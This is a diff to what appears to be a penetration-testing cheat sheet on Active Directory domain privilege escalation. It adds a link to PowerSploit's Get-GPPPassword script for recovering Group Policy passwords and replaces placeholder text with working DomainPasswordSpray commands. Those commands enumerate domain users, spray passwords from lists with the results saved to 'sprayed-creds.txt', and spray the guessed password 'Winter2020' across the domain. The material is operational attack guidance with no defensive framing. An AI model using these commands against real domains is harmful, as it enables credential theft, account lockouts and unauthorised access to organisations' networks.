@@ -53,11 +53,19 @@ powershell
 -------------------------------------------------------------
 ## Domain Privilege Escalation
 ### GPP Password
+[Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
 
 ### Password spraying
 [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)
 ```
-test code
+Get a domain user list
+# powershell Get-DomainUserList -Domain lab.com -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
+
+Password spray from a username and password list
+# powershell Invoke-DomainPasswordSpray -UserList userlist.txt -PasswordList passlist.txt -Domain lab.com -OutFile sprayed-creds.txt
+
+Auto spray a specific password on an auto-generated user list (*noisy*)
+# powershell Invoke-DomainPasswordSpray -Password Winter2020
 ```
 
 ### Kerberoasting
